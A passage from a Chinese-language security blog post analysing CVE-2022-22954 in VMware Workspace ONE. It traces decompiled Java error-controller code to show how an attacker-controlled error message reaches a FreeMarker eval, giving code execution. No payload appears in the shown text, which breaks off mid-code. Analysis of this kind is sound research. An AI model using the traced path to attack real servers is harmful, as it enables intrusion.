<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>CVE-2022-22954 :: Ca1s1&#39;Blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="CVE-2022-22954 代码分析 http://file.xipudata.com/?dir=/2_software/Vmware/Horizon8 下载好ova，使用vmware安装搭建，导入时添加下域名。 根据官方提供的临时修复脚本可以知道漏洞存在于 /opt/vmware/horizon/workspace/webapps/catalog-portal/WEB-INF/lib/endusercatalog-ui-1.0-SNAPSHOT-classes.jar 修复脚本中还提到了这个文件 查看该文件后发现存在eval，这是java freemarker的写法，用来把字符串当作ftl代码，所以我们只需要控制errorObj即可实现代码执行 所以我们知道漏洞来源于customError,我们需要找到可以到达customError的路由，并且可以控制errorObj 在UiErrorController.class中可以找到handleGenericError，可以传递errorObj，最后return到customError
private String handleGenericError(final HttpServletRequest request, final HttpServletResponse response, final Map&lt;String, Object&gt; model, final boolean isAWJade, final boolean garnetAndAbove, final String excpClass, final int errorCode, final String errorMessage) { final String localizedMessageHeader = this.messages.getLocalizedErrorMessage(&#34;errorPage.errorHeading&#34;, request.getLocale(), (Object[])null); final String localizedMessage = this.messages.getLocalizedErrorMessage(this.getLocalizedMessageKey(excpClass), request.getLocale(), (Object[])null); if (errorCode != -1) { response.setStatus(errorCode); } model.put(&#34;errorObj&#34;, errorMessage); model.put(&#34;messageHeader&#34;, localizedMessageHeader); model.put(&#34;genericErrorMsg&#34;, localizedMessage); model.put(&#34;contextPath&#34;, request.getContextPath()); if (isAWJade) { WebUtils.markCookiesForDeletion(request, response, new String[] { &#34;USER_CATALOG_CONTEXT&#34; }); WebUtils.markCookiesForDeletionWithPath(request, response, &#34;/catalog-portal&#34;, new String[] { &#34;EUC_XSRF_TOKEN&#34; }); model.put(&#34;logoutPath&#34;, retrieveServerInitiatedLogoutPath(garnetAndAbove).getName()); } else { final StringBuilder logoutUrl = new StringBuilder(request.getContextPath()).append(&#34;/ui&#34;).append(&#34;/logout&#34;); String queryStr = request.getQueryString(); if (StringUtils.isNotBlank((CharSequence)queryStr)) { queryStr = UrlUtils.encodeQuery(UrlUtils.decode(queryStr)); logoutUrl.append(&#39;?&#39;).append(queryStr); } model.put(&#34;logoutPath&#34;, logoutUrl.toString()); } return &#34;customError&#34;; } 所以我们继续往上找到getErrorPage和handleUnauthorizedError，调用了handleGenericError
" />
<meta name="keywords" content="CVE, vmware, 复现" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="https://vuln.top/posts/cve-2022-22954/" />






  
  
  
  
  
  <link rel="stylesheet" href="https://vuln.top/styles.css">







  <link rel="shortcut icon" href="https://vuln.top/img/theme-colors/green.png">
  <link rel="apple-touch-icon" href="https://vuln.top/img/theme-colors/green.png">



<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="CVE-2022-22954">
<meta property="og:description" content="CVE-2022-22954 代码分析 http://file.xipudata.com/?dir=/2_software/Vmware/Horizon8 下载好ova，使用vmware安装搭建，导入时添加下域名。 根据官方提供的临时修复脚本可以知道漏洞存在于 /opt/vmware/horizon/workspace/webapps/catalog-portal/WEB-INF/lib/endusercatalog-ui-1.0-SNAPSHOT-classes.jar 修复脚本中还提到了这个文件 查看该文件后发现存在eval，这是java freemarker的写法，用来把字符串当作ftl代码，所以我们只需要控制errorObj即可实现代码执行 所以我们知道漏洞来源于customError,我们需要找到可以到达customError的路由，并且可以控制errorObj 在UiErrorController.class中可以找到handleGenericError，可以传递errorObj，最后return到customError
private String handleGenericError(final HttpServletRequest request, final HttpServletResponse response, final Map&lt;String, Object&gt; model, final boolean isAWJade, final boolean garnetAndAbove, final String excpClass, final int errorCode, final String errorMessage) { final String localizedMessageHeader = this.messages.getLocalizedErrorMessage(&#34;errorPage.errorHeading&#34;, request.getLocale(), (Object[])null); final String localizedMessage = this.messages.getLocalizedErrorMessage(this.getLocalizedMessageKey(excpClass), request.getLocale(), (Object[])null); if (errorCode != -1) { response.setStatus(errorCode); } model.put(&#34;errorObj&#34;, errorMessage); model.put(&#34;messageHeader&#34;, localizedMessageHeader); model.put(&#34;genericErrorMsg&#34;, localizedMessage); model.put(&#34;contextPath&#34;, request.getContextPath()); if (isAWJade) { WebUtils.markCookiesForDeletion(request, response, new String[] { &#34;USER_CATALOG_CONTEXT&#34; }); WebUtils.markCookiesForDeletionWithPath(request, response, &#34;/catalog-portal&#34;, new String[] { &#34;EUC_XSRF_TOKEN&#34; }); model.put(&#34;logoutPath&#34;, retrieveServerInitiatedLogoutPath(garnetAndAbove).getName()); } else { final StringBuilder logoutUrl = new StringBuilder(request.getContextPath()).append(&#34;/ui&#34;).append(&#34;/logout&#34;); String queryStr = request.getQueryString(); if (StringUtils.isNotBlank((CharSequence)queryStr)) { queryStr = UrlUtils.encodeQuery(UrlUtils.decode(queryStr)); logoutUrl.append(&#39;?&#39;).append(queryStr); } model.put(&#34;logoutPath&#34;, logoutUrl.toString()); } return &#34;customError&#34;; } 所以我们继续往上找到getErrorPage和handleUnauthorizedError，调用了handleGenericError
" />
<meta property="og:url" content="https://vuln.top/posts/cve-2022-22954/" />
<meta property="og:site_name" content="Ca1s1&#39;Blog" />

  
  
  <meta property="og:image" content="https://vuln.top/">

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2023-01-23 00:00:00 &#43;0000 UTC" />












</head>
<body class="green">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="https://vuln.top/">
  <div class="logo">
    Ca1s1'Blog
  </div>
</a>

    </div>
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;▾</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="/about/">about</a></li>
        
      
        
          <li><a href="/link/">link</a></li>
        
      
      
    </ul>
  </li>
</ul>

    
    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
        
          <li><a href="/about/" >about</a></li>
        
      
        
          <li><a href="/link/" >link</a></li>
        
      
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="https://vuln.top/posts/cve-2022-22954/">CVE-2022-22954</a>
  </h1>
  <div class="post-meta">
    
      <time class="post-date">
        2023-01-23 ::
        
      </time>
    
    
      <span class="post-author">Ca1s1</span>
    
    
      <span class="post-reading-time">:: 4 min read (697 words)</span>
    
  </div>

  
    <span class="post-tags">
      
      #<a href="https://vuln.top/tags/%E5%A4%8D%E7%8E%B0/">复现</a>&nbsp;
      
      #<a href="https://vuln.top/tags/cve/">CVE</a>&nbsp;
      
    </span>
  
  


  

  <div class="post-content"><div>
        <h1 id="cve-2022-22954">CVE-2022-22954<a href="#cve-2022-22954" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<h2 id="代码分析">代码分析<a href="#代码分析" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p><a href="http://file.xipudata.com/?dir=/2_software/Vmware/Horizon8">http://file.xipudata.com/?dir=/2_software/Vmware/Horizon8</a>
下载好ova，使用vmware安装搭建，导入时添加下域名。
<img src="/img/16534685569681/16534686232696.jpg" alt="">
根据官方提供的临时修复脚本可以知道漏洞存在于
<code>/opt/vmware/horizon/workspace/webapps/catalog-portal/WEB-INF/lib/endusercatalog-ui-1.0-SNAPSHOT-classes.jar</code>
<img src="/img/16534685569681/16534687156233.jpg" alt="">
修复脚本中还提到了这个文件
<img src="/img/16534685569681/16534692518129.jpg" alt="">
查看该文件后发现存在eval，这是java freemarker的写法，用来把字符串当作ftl代码，所以我们只需要控制errorObj即可实现代码执行
<img src="/img/16534685569681/16534695194137.jpg" alt="">
所以我们知道漏洞来源于customError,我们需要找到可以到达customError的路由，并且可以控制errorObj
在UiErrorController.class中可以找到handleGenericError，可以传递errorObj，最后return到customError</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> String <span style="color:#a6e22e">handleGenericError</span>(<span style="color:#66d9ef">final</span> HttpServletRequest request, <span style="color:#66d9ef">final</span> HttpServletResponse response, <span style="color:#66d9ef">final</span> Map<span style="color:#f92672">&lt;</span>String, Object<span style="color:#f92672">&gt;</span> model, <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">boolean</span> isAWJade, <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">boolean</span> garnetAndAbove, <span style="color:#66d9ef">final</span> String excpClass, <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> errorCode, <span style="color:#66d9ef">final</span> String errorMessage) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> String localizedMessageHeader <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">messages</span>.<span style="color:#a6e22e">getLocalizedErrorMessage</span>(<span style="color:#e6db74">&#34;errorPage.errorHeading&#34;</span>, request.<span style="color:#a6e22e">getLocale</span>(), (Object<span style="color:#f92672">[]</span>)<span style="color:#66d9ef">null</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> String localizedMessage <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">messages</span>.<span style="color:#a6e22e">getLocalizedErrorMessage</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getLocalizedMessageKey</span>(excpClass), request.<span style="color:#a6e22e">getLocale</span>(), (Object<span style="color:#f92672">[]</span>)<span style="color:#66d9ef">null</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (errorCode <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span>1) {
</span></span><span style="display:flex;"><span>            response.<span style="color:#a6e22e">setStatus</span>(errorCode);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        model.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;errorObj&#34;</span>, errorMessage);
</span></span><span style="display:flex;"><span>        model.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;messageHeader&#34;</span>, localizedMessageHeader);
</span></span><span style="display:flex;"><span>        model.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;genericErrorMsg&#34;</span>, localizedMessage);
</span></span><span style="display:flex;"><span>        model.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;contextPath&#34;</span>, request.<span style="color:#a6e22e">getContextPath</span>());
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (isAWJade) {
</span></span><span style="display:flex;"><span>            WebUtils.<span style="color:#a6e22e">markCookiesForDeletion</span>(request, response, <span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span> { <span style="color:#e6db74">&#34;USER_CATALOG_CONTEXT&#34;</span> });
</span></span><span style="display:flex;"><span>            WebUtils.<span style="color:#a6e22e">markCookiesForDeletionWithPath</span>(request, response, <span style="color:#e6db74">&#34;/catalog-portal&#34;</span>, <span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span> { <span style="color:#e6db74">&#34;EUC_XSRF_TOKEN&#34;</span> });
</span></span><span style="display:flex;"><span>            model.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;logoutPath&#34;</span>, retrieveServerInitiatedLogoutPath(garnetAndAbove).<span style="color:#a6e22e">getName</span>());
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">final</span> StringBuilder logoutUrl <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder(request.<span style="color:#a6e22e">getContextPath</span>()).<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#34;/ui&#34;</span>).<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#34;/logout&#34;</span>);
</span></span><span style="display:flex;"><span>            String queryStr <span style="color:#f92672">=</span> request.<span style="color:#a6e22e">getQueryString</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (StringUtils.<span style="color:#a6e22e">isNotBlank</span>((CharSequence)queryStr)) {
</span></span><span style="display:flex;"><span>                queryStr <span style="color:#f92672">=</span> UrlUtils.<span style="color:#a6e22e">encodeQuery</span>(UrlUtils.<span style="color:#a6e22e">decode</span>(queryStr));
</span></span><span style="display:flex;"><span>                logoutUrl.<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#39;?&#39;</span>).<span style="color:#a6e22e">append</span>(queryStr);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            model.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;logoutPath&#34;</span>, logoutUrl.<span style="color:#a6e22e">toString</span>());
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;customError&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>所以我们继续往上找到<code>getErrorPage</code>和<code>handleUnauthorizedError</code>，调用了<code>handleGenericError</code></p>
<h2 id="geterrorpage">getErrorPage<a href="#geterrorpage" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> String <span style="color:#a6e22e">getErrorPage</span>(<span style="color:#66d9ef">final</span> HttpServletRequest request, <span style="color:#66d9ef">final</span> HttpServletResponse response, <span style="color:#66d9ef">final</span> Map<span style="color:#f92672">&lt;</span>String, Object<span style="color:#f92672">&gt;</span> model, <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> errorCode, <span style="color:#66d9ef">final</span> String errorMessage, <span style="color:#66d9ef">final</span> String exClass) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> Exception exp <span style="color:#f92672">=</span> (request.<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">&#34;javax.servlet.error.exception&#34;</span>) <span style="color:#66d9ef">instanceof</span> Exception) <span style="color:#f92672">?</span> ((Exception)request.<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">&#34;javax.servlet.error.exception&#34;</span>)) : <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> String userAgent <span style="color:#f92672">=</span> UserAgentResolver.<span style="color:#a6e22e">resolveUserAgent</span>(request.<span style="color:#a6e22e">getHeader</span>(<span style="color:#e6db74">&#34;User-Agent&#34;</span>), WebUtils.<span style="color:#a6e22e">getCookie</span>(request, <span style="color:#e6db74">&#34;AWJADE&#34;</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">logFor</span>(errorCode, <span style="color:#e6db74">&#34;Error reported is {} {} for forward {}&#34;</span>, errorCode, errorMessage, request.<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">&#34;javax.servlet.forward.request_uri&#34;</span>), exp);
</span></span><span style="display:flex;"><span>        UiErrorController.<span style="color:#a6e22e">LOGGER</span>.<span style="color:#a6e22e">info</span>(<span style="color:#e6db74">&#34;The client user agent is : {}, the host is : {}, the referer is {}&#34;</span>, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span> { userAgent, request.<span style="color:#a6e22e">getHeader</span>(<span style="color:#e6db74">&#34;Host&#34;</span>), request.<span style="color:#a6e22e">getHeader</span>(<span style="color:#e6db74">&#34;Referer&#34;</span>) });
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">boolean</span> isAWJade <span style="color:#f92672">=</span> UserAgentResolver.<span style="color:#a6e22e">isNativeApp</span>(userAgent);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">boolean</span> garnetAndAbove <span style="color:#f92672">=</span> UserAgentResolver.<span style="color:#a6e22e">isGarnetAndAbove</span>(userAgent);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> String errorPage <span style="color:#f92672">=</span> Optional.<span style="color:#a6e22e">of</span>(errorCode).<span style="color:#a6e22e">filter</span>(<span style="color:#66d9ef">this</span>::isErrorTypeUnauthorized).<span style="color:#a6e22e">map</span>(errCd <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">handleUnauthorizedError</span>(request, response, model, isAWJade, garnetAndAbove, exClass, errCd, errorMessage)).<span style="color:#a6e22e">orElseGet</span>(() <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">handleGenericError</span>(request, response, model, isAWJade, garnetAndAbove, exClass, errorCode, errorMessage));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> StringUtils.<span style="color:#a6e22e">hasText</span>(errorPage) <span style="color:#f92672">?</span> errorPage : <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><h2 id="handleunauthorizederror">handleUnauthorizedError<a href="#handleunauthorizederror" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>        <span style="color:#66d9ef">private</span> String <span style="color:#a6e22e">handleUnauthorizedError</span>(<span style="color:#66d9ef">final</span> HttpServletRequest request, <span style="color:#66d9ef">final</span> HttpServletResponse response, <span style="color:#66d9ef">final</span> Map<span style="color:#f92672">&lt;</span>String, Object<span style="color:#f92672">&gt;</span> model, <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">boolean</span> isAWJade, <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">boolean</span> garnetAndAbove, <span style="color:#66d9ef">final</span> String excpClass, <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> errorCode, <span style="color:#66d9ef">final</span> String errorMessage) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> String uiRequestId <span style="color:#f92672">=</span> Objects.<span style="color:#a6e22e">nonNull</span>(request.<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">&#34;UI_REQUEST&#34;</span>)) <span style="color:#f92672">?</span> ((UiRequest)request.<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">&#34;UI_REQUEST&#34;</span>)).<span style="color:#a6e22e">getRequestId</span>() : <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (isAWJade) {
</span></span><span style="display:flex;"><span>            WebUtils.<span style="color:#a6e22e">markCookiesForDeletion</span>(request, response, <span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span> { <span style="color:#e6db74">&#34;USER_CATALOG_CONTEXT&#34;</span> });
</span></span><span style="display:flex;"><span>            WebUtils.<span style="color:#a6e22e">markCookiesForDeletionWithPath</span>(request, response, <span style="color:#e6db74">&#34;/catalog-portal&#34;</span>, <span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span> { <span style="color:#e6db74">&#34;EUC_XSRF_TOKEN&#34;</span> });
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> Optional.<span style="color:#a6e22e">ofNullable</span>(excpClass).<span style="color:#a6e22e">filter</span>(<span style="color:#66d9ef">this</span>::isSpecificUnauthError).<span style="color:#a6e22e">map</span>(excepClass <span style="color:#f92672">-&gt;</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">sendRedirect</span>(response, retrieveServerInitiatedLogoutPath(garnetAndAbove).<span style="color:#a6e22e">getName</span>(), uiRequestId);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>            }).<span style="color:#a6e22e">orElseGet</span>(() <span style="color:#f92672">-&gt;</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">sendRedirect</span>(response, retrieveInvalidAccessTokenLogoutPath(garnetAndAbove).<span style="color:#a6e22e">getName</span>(), uiRequestId);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>            });
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> String uiRequestId2;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> Optional.<span style="color:#a6e22e">ofNullable</span>(excpClass).<span style="color:#a6e22e">filter</span>(<span style="color:#66d9ef">this</span>::isSpecificUnauthError).<span style="color:#a6e22e">map</span>(excepClass <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">handleGenericError</span>(request, response, model, isAWJade, garnetAndAbove, excpClass, errorCode, errorMessage)).<span style="color:#a6e22e">orElseGet</span>(() <span style="color:#f92672">-&gt;</span> {
</span></span><span style="display:flex;"><span>            WebUtils.<span style="color:#a6e22e">markCookiesForDeletion</span>(request, response, <span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span> { <span style="color:#e6db74">&#34;USER_CATALOG_CONTEXT&#34;</span>, <span style="color:#e6db74">&#34;HZN&#34;</span> });
</span></span><span style="display:flex;"><span>            WebUtils.<span style="color:#a6e22e">markCookiesForDeletionWithPath</span>(request, response, <span style="color:#e6db74">&#34;/catalog-portal&#34;</span>, <span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span> { <span style="color:#e6db74">&#34;EUC_XSRF_TOKEN&#34;</span> });
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">isMdmOnlyUnauthorizedAccessError</span>(request, excpClass)) {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">handleGenericError</span>(request, response, model, isAWJade, garnetAndAbove, excpClass, errorCode, errorMessage);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">sendRedirect</span>(response, UrlUtils.<span style="color:#a6e22e">buildUrlWithBaseAndPath</span>(request, <span style="color:#e6db74">&#34;/ui&#34;</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">urlScheme</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">urlPort</span>, <span style="color:#66d9ef">true</span>), uiRequestId2);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        });
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span></code></pre></div><p>我们先看第一个getErrorPage，有两条路由会到达getErrorPage,但是直接访问路由无法控制errorObj参数</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#a6e22e">@RequestMapping</span>({ <span style="color:#e6db74">&#34;/ui/view/error&#34;</span> })
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@ApiOperation</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;sendError&#34;</span>, notes <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">sendError</span>(<span style="color:#66d9ef">final</span> HttpServletRequest request, <span style="color:#66d9ef">final</span> HttpServletResponse response, <span style="color:#66d9ef">final</span> Map<span style="color:#f92672">&lt;</span>String, Object<span style="color:#f92672">&gt;</span> model) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> errorCode <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>)request.<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">&#34;javax.servlet.error.status_code&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> String errorMessage <span style="color:#f92672">=</span> (String)request.<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">&#34;javax.servlet.error.message&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">logFor</span>(errorCode, <span style="color:#e6db74">&#34;Error status code: {}, error message: {}&#34;</span>, errorCode, errorMessage);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> String exClass <span style="color:#f92672">=</span> (request.<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">&#34;javax.servlet.error.exception_type&#34;</span>) <span style="color:#66d9ef">instanceof</span> Class) <span style="color:#f92672">?</span> ((Class)request.<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">&#34;javax.servlet.error.exception_type&#34;</span>)).<span style="color:#a6e22e">getCanonicalName</span>() : <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getErrorPage</span>(request, response, model, errorCode, errorMessage, exClass);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@RequestMapping</span>({ <span style="color:#e6db74">&#34;/error&#34;</span> })
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@ApiOperation</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;sendUnhandledError&#34;</span>, notes <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">sendUnhandledError</span>(<span style="color:#66d9ef">final</span> HttpServletRequest request, <span style="color:#66d9ef">final</span> HttpServletResponse response, <span style="color:#66d9ef">final</span> Map<span style="color:#f92672">&lt;</span>String, Object<span style="color:#f92672">&gt;</span> model) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> errorCode <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>)((request.<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">&#34;javax.servlet.error.status_code&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) <span style="color:#f92672">?</span> <span style="color:#f92672">-</span>1 : request.<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">&#34;javax.servlet.error.status_code&#34;</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> String errorMessage <span style="color:#f92672">=</span> (String)((request.<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">&#34;javax.servlet.error.message&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;&#34;</span> : request.<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">&#34;javax.servlet.error.message&#34;</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> String exClass <span style="color:#f92672">=</span> (request.<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">&#34;javax.servlet.error.exception_type&#34;</span>) <span style="color:#66d9ef">instanceof</span> Class) <span style="color:#f92672">?</span> ((Class)request.<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">&#34;javax.servlet.error.exception_type&#34;</span>)).<span style="color:#a6e22e">getCanonicalName</span>() : <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> String errorObj <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;{\&#34;code\&#34;:\&#34;&#34;</span> <span style="color:#f92672">+</span> errorCode <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\&#34;, \&#34;message\&#34;:\&#34;&#34;</span> <span style="color:#f92672">+</span> errorMessage <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\&#34;}&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getErrorPage</span>(request, response, model, errorCode, errorObj, exClass);
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>所以还需要找到一个路由，可以控制errorObj参数，最终找到resolveException，可以控制且能够访问到/ui/view/error路由
<img src="/img/16534685569681/16534707365468.jpg" alt="">
这时候我们只需要找到触发异常的方法，控制errorObj即可，继续往上看，找到ExceptionHandler,这是一个处理异常的类，只要当程序抛出Exception异常就会进入handleAnyGenericException，最终到达/ui/view/error</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>  <span style="color:#a6e22e">@ExceptionHandler</span>({ Exception.<span style="color:#a6e22e">class</span> })
